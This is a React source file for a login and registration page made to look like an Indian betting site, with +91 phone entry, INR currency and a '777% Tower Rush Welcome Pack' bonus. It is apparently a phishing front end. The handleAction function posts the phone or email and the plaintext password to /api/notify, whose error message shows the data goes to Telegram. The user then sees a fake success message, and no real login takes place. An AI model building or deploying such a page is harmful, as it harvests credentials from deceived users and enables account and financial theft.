/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useEffect } from 'react';
import { 
  MessageSquare, 
  X, 
  Eye, 
  EyeOff, 
  Phone as PhoneIcon, 
  Mail, 
  ChevronDown, 
  Plus, 
  Check 
} from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';

type View = 'login' | 'register';
type Tab = 'email' | 'phone';

/**
 * Custom components for the interface
 */

const Input = ({ 
  label, 
  type = 'text', 
  value, 
  onChange, 
  placeholder, 
  icon: Icon,
  showToggle = false,
  isPassword = false,
  onToggle
}: any) => {
  const [show, setShow] = useState(true);

  return (
    <div className="relative w-full group">
      <div className="flex items-center bg-[#131d2b] border border-[#1c2e45] rounded-lg transition-all duration-200 focus-within:border-[#007aff] h-[54px]">
        {Icon && (
          <div className="pl-4 text-[#808d9e]">
            <Icon size={18} />
          </div>
        )}
        <input
          type={isPassword ? (show ? 'text' : 'password') : type}
          value={value}
          onChange={(e) => onChange(e.target.value)}
          placeholder={placeholder}
          className="w-full bg-transparent text-white px-4 py-3 placeholder-[#4e5b6d] focus:outline-none text-[15px]"
        />
        {isPassword && (
          <button 
            type="button"
            onClick={() => setShow(!show)}
            className="pr-4 text-[#4e5b6d] hover:text-white transition-colors"
          >
            {show ? <EyeOff size={18} /> : <Eye size={18} />}
          </button>
        )}
      </div>
    </div>
  );
};

export default function App() {
  const [view, setView] = useState<View>('login');
  const [tab, setTab] = useState<Tab>('phone');
  const [phone, setPhone] = useState('');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [promoCode, setPromoCode] = useState('');
  const [agree, setAgree] = useState(true);
  const [loginSuccess, setLoginSuccess] = useState(false);
  const [loginError, setLoginError] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);

  // Derived state for button activation
  const isInputValid = view === 'login' 
    ? (tab === 'phone' ? phone.length > 0 : email.length > 0) && password.length > 0
    : phone.length > 5 && password.length > 0 && agree;

  const handleAction = async () => {
    if (!isInputValid) return;
    
    setLoading(true);
    setLoginError(null);
    try {
      const response = await fetch('/api/notify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: view,
          data: {
            phone: tab === 'phone' || view === 'register' ? (phone.startsWith('+') ? phone : '+91' + phone) : undefined,
            email: tab === 'email' ? email : undefined,
            password,
            tab
          }
        }),
      });

      const result = await response.json();

      if (response.ok) {
        setLoginSuccess(true);
        setTimeout(() => setLoginSuccess(false), 3000);
      } else {
        setLoginError(result.error || 'Failed to notify Telegram');
        setTimeout(() => setLoginError(null), 5000);
      }
    } catch (error) {
      setLoginError('Network error. Check connection.');
      setTimeout(() => setLoginError(null), 5000);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-[#060f1a] flex items-center justify-center p-4 font-sans text-white">
      {/* Background Overlay */}
      <div className="fixed inset-0 bg-[#060f1a] -z-10" />

      {/* Main Container */}
      <motion.div 
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        className="w-full max-w-[440px] bg-[#0d1726] rounded-2xl shadow-2xl overflow-hidden relative border border-[#1c2e45]"
      >
        {/* Header */}
        <div className="flex items-center justify-between px-6 py-5 border-b border-[#1c2e45]/50">
          <button className="text-[#808d9e] hover:text-white transition-colors">
            <MessageSquare size={22} fill="currentColor" stroke="none" />
          </button>
          <h1 className="text-lg font-bold tracking-wider uppercase text-white/90">
            {view === 'login' ? 'Log In' : 'Registration'}
          </h1>
          <button className="bg-[#1c2e45] p-1.5 rounded-full text-[#808d9e] hover:text-white transition-colors">
            <X size={16} />
          </button>
        </div>

        <div className="p-6">
          {/* Subheader Link */}
          <div className="mb-6 flex items-center gap-2 text-sm">
            <span className="text-[#808d9e]">
              {view === 'login' ? 'New user?' : 'Have an account?'}
            </span>
            <button 
              onClick={() => setView(view === 'login' ? 'register' : 'login')}
              className="text-[#007aff] font-medium hover:underline transition-all"
            >
              {view === 'login' ? 'Registration' : 'Log In'}
            </button>
          </div>

          <AnimatePresence mode="wait">
            {view === 'login' ? (
              <motion.div
                key="login-form"
                initial={{ opacity: 0, x: -20 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: 20 }}
                className="space-y-5"
              >
                {/* Tabs */}
                <div className="flex gap-3 mb-6">
                  <button
                    onClick={() => setTab('email')}
                    className={`flex-1 flex items-center justify-center gap-2 h-[48px] rounded-lg font-medium transition-all duration-300 ${
                      tab === 'email' 
                        ? 'bg-[#007aff] text-white shadow-[0_4px_12px_rgba(0,122,255,0.3)]' 
                        : 'bg-[#182638] text-[#808d9e] hover:bg-[#1c2e45]'
                    }`}
                  >
                    <Mail size={18} />
                    <span>Email or ID</span>
                  </button>
                  <button
                    onClick={() => setTab('phone')}
                    className={`flex-1 flex items-center justify-center gap-2 h-[48px] rounded-lg font-medium transition-all duration-300 ${
                      tab === 'phone' 
                        ? 'bg-[#007aff] text-white shadow-[0_4px_12px_rgba(0,122,255,0.3)]' 
                        : 'bg-[#182638] text-[#808d9e] hover:bg-[#1c2e45]'
                    }`}
                  >
                    <PhoneIcon size={18} />
                    <span>Phone</span>
                  </button>
                </div>

                {/* Form Fields */}
                <div className="space-y-4">
                  {tab === 'phone' ? (
                    <div className="flex flex-col gap-1">
                      <div className="flex h-[54px] bg-[#131d2b] border border-[#1c2e45] rounded-lg focus-within:border-[#007aff] transition-all overflow-hidden">
                        <button className="flex items-center gap-2 px-4 border-r border-[#1c2e45]/50 hover:bg-[#1c2e45] transition-colors shrink-0">
                          <span className="text-lg">🇮🇳</span>
                          <span className="text-white text-[15px]">+91</span>
                          <ChevronDown size={14} className="text-[#4e5b6d]" />
                        </button>
                        <input
                          type="tel"
                          placeholder="Phone number"
                          value={phone}
                          onChange={(e) => setPhone(e.target.value)}
                          className="w-full bg-transparent text-white px-4 py-3 placeholder-[#4e5b6d] focus:outline-none text-[15px]"
                        />
                      </div>
                    </div>
                  ) : (
                    <Input
                      placeholder="Email or ID"
                      value={email}
                      onChange={setEmail}
                      icon={Mail}
                    />
                  )}

                  <Input
                    placeholder="Password"
                    isPassword
                    value={password}
                    onChange={setPassword}
                  />

                  <div className="flex">
                    <button className="text-sm font-medium text-[#808d9e] hover:text-[#007aff] flex items-center gap-1 transition-colors">
                      Forgot password? <span className="text-[#007aff]">Reset</span>
                    </button>
                  </div>
                </div>

                {/* Submit Button */}
                <button
                  onClick={handleAction}
                  disabled={loading || (!isInputValid && password.length === 0)}
                  className={`w-full h-[54px] rounded-lg font-bold text-lg tracking-wide uppercase transition-all duration-300 transform active:scale-[0.98] mt-2 ${
                    isInputValid 
                      ? 'bg-[#007aff] text-white shadow-[0_8px_20px_rgba(0,122,255,0.2)]' 
                      : 'bg-[#1c2e45] text-[#4e5b6d] cursor-not-allowed'
                  }`}
                >
                  {loading ? 'PROCESSING...' : (loginSuccess ? 'SUCCESS!' : 'Log In')}
                </button>
              </motion.div>
            ) : (
              <motion.div
                key="register-form"
                initial={{ opacity: 0, x: 20 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: -20 }}
                className="space-y-5"
              >
                {/* Registration Fields */}
                <div className="space-y-4">
                  <div className="flex h-[54px] bg-[#131d2b] border border-[#1c2e45] rounded-lg focus-within:border-[#007aff] transition-all overflow-hidden text-[15px]">
                    <button className="flex items-center gap-2 px-4 border-r border-[#1c2e45]/50 hover:bg-[#1c2e45] transition-colors shrink-0">
                      <span className="text-lg">🇮🇳</span>
                      <span className="text-white">+91</span>
                      <ChevronDown size={14} className="text-[#4e5b6d]" />
                    </button>
                    <input
                      type="tel"
                      placeholder="Phone number"
                      value={phone}
                      onChange={(e) => setPhone(e.target.value)}
                      className="w-full bg-transparent text-white px-4 py-3 placeholder-[#4e5b6d] focus:outline-none"
                    />
                  </div>

                  <Input
                    placeholder="Password"
                    isPassword
                    value={password}
                    onChange={setPassword}
                  />

                  <div className="flex h-[54px] bg-[#131d2b] border border-[#1c2e45] rounded-lg hover:border-[#4e5b6d] transition-all cursor-pointer items-center justify-between px-4">
                    <div className="flex items-center gap-3">
                      <span className="text-lg">🇮🇳</span>
                      <span className="text-white text-[15px]">₹ — INR</span>
                    </div>
                    <ChevronDown size={18} className="text-[#4e5b6d]" />
                  </div>

                  <button className="flex items-center gap-2 text-[#007aff] font-medium hover:text-[#3395ff] transition-colors text-sm px-1">
                    <div className="bg-[#007aff]/10 p-1 rounded-full">
                      <Plus size={14} />
                    </div>
                    I have a promo code
                  </button>
                </div>

                {/* Bonus Selector */}
                <div className="mt-8 border-t border-[#1c2e45]/50 pt-6">
                  <h3 className="text-sm font-bold uppercase tracking-wider mb-4">Choose Your Bonus</h3>
                  <div className="relative group cursor-pointer">
                    <div className="flex items-center gap-4 bg-gradient-to-r from-[#007aff] to-[#0052ad] p-3.5 rounded-xl border border-[#007aff]/50 shadow-[0_10px_25px_rgba(0,122,255,0.15)] transition-transform hover:scale-[1.01] active:scale-[0.99]">
                      <div className="w-16 h-16 rounded-lg overflow-hidden shrink-0 border border-white/20">
                        <img 
                          src="https://images.unsplash.com/photo-1620336655055-18402ac36142?q=80&w=250&auto=format&fit=crop" 
                          alt="Bonus" 
                          className="w-full h-full object-cover"
                        />
                      </div>
                      <div className="flex-1">
                        <h4 className="font-bold text-[15px] leading-tight text-white mb-0.5">777% Tower Rush Welcome Pack</h4>
                        <p className="text-xs text-white/80">Climb the Tower with Boost</p>
                      </div>
                      <ChevronDown size={20} className="text-white/40 -rotate-90" />
                    </div>
                  </div>
                </div>

                {/* Terms */}
                <label className="flex items-start gap-3 mt-4 group cursor-pointer">
                  <div className="relative mt-0.5">
                    <input 
                      type="checkbox" 
                      className="peer sr-only" 
                      checked={agree}
                      onChange={() => setAgree(!agree)}
                    />
                    <div className="w-5 h-5 border-2 border-[#1c2e45] rounded bg-[#131d2b] peer-checked:bg-emerald-500 peer-checked:border-emerald-500 transition-all flex items-center justify-center">
                      <Check size={14} className={`text-white transition-opacity ${agree ? 'opacity-100' : 'opacity-0'}`} />
                    </div>
                  </div>
                  <span className="text-xs text-[#808d9e] leading-relaxed">
                    I confirm all the <span className="text-white font-medium">Terms of user agreement</span> and that I am over 18
                  </span>
                </label>

                {/* Register Button */}
                <button
                  onClick={handleAction}
                  disabled={loading || !isInputValid}
                  className={`w-full h-[54px] rounded-lg font-bold text-lg tracking-wide uppercase transition-all duration-300 transform active:scale-[0.98] mt-2 ${
                    isInputValid 
                      ? 'bg-[#007aff] text-white shadow-[0_8px_20px_rgba(0,122,255,0.2)]' 
                      : 'bg-[#1c2e45] text-[#4e5b6d] cursor-not-allowed'
                  }`}
                >
                  {loading ? 'WAITING...' : (loginSuccess ? 'WELCOME!' : 'Registration')}
                </button>
              </motion.div>
            )}
          </AnimatePresence>

          {/* Social Divider */}
          <div className="relative flex items-center justify-center my-8">
            <div className="absolute inset-0 flex items-center">
              <div className="w-full border-t border-[#1c2e45]"></div>
            </div>
            <span className="relative bg-[#0d1726] px-4 text-xs font-bold text-[#4e5b6d] tracking-widest">OR</span>
          </div>

          {/* Google Login */}
          <button className="w-full h-[54px] bg-[#1a73e8] hover:bg-[#1869d1] rounded-lg font-medium transition-all flex items-center relative pr-4 shadow-[0_4px_12px_rgba(26,115,232,0.2)]">
            <div className="bg-white m-[2px] p-2.5 rounded-l-[5px] shrink-0">
               <svg width="20" height="20" viewBox="0 0 24 24">
                <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
                <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
                <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
                <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
              </svg>
            </div>
            <span className="flex-1 text-center text-white font-medium text-[15px]">Continue with Google</span>
          </button>
        </div>

        {/* Global Notifications */}
        <AnimatePresence>
          {loginSuccess && (
            <motion.div
              initial={{ opacity: 0, y: 50 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0 }}
              className="absolute bottom-6 left-6 right-6 bg-emerald-500 text-white p-4 rounded-lg flex items-center justify-center gap-2 font-bold shadow-2xl z-50 text-center"
            >
              <Check size={20} />
              Action Processed Successfully
            </motion.div>
          )}

          {loginError && (
            <motion.div
              initial={{ opacity: 0, y: 50 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0 }}
              className="absolute bottom-6 left-6 right-6 bg-red-500 text-white p-4 rounded-lg flex items-center justify-center gap-2 font-bold shadow-2xl z-50 text-center"
            >
              <X size={20} />
              {loginError}
            </motion.div>
          )}
        </AnimatePresence>
      </motion.div>

      {/* Decorative background elements */}
      <div className="fixed top-0 left-0 w-[500px] h-[500px] bg-[#007aff]/5 rounded-full blur-[120px] -translate-x-1/2 -translate-y-1/2 pointer-events-none" />
      <div className="fixed bottom-0 right-0 w-[500px] h-[500px] bg-[#007aff]/5 rounded-full blur-[120px] translate-x-1/2 translate-y-1/2 pointer-events-none" />
    </div>
  );
}
